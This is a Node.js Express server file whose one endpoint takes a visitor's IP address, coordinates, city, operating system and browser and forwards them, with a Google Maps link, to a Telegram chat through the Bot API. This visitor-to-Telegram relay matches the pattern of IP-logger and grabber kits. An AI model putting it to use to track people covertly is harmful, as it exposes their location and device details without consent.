const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());

app.post('/send-message', async (req, res) => {
    const { ip, location, os, browser } = req.body;

    const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN';
    const chatId = 'YOUR_CHAT_ID';
    const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
    const message = `
New visitor detected!
IP Address: ${ip}
Location: ${location.country}, ${location.city} (${location.latitude}, ${location.longitude})
Google Maps: ${googleMapsUrl}
Operating System: ${os}
Browser: ${browser}
    `;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            chat_id: chatId,
            text: message
        });

        if (response.data.ok) {
            res.status(200).json({ message: 'Message sent successfully' });
        } else {
            throw new Error('Failed to send message');
        }
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        res.status(500).json({ message: 'Failed to send message to Telegram' });
    }
});

app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});
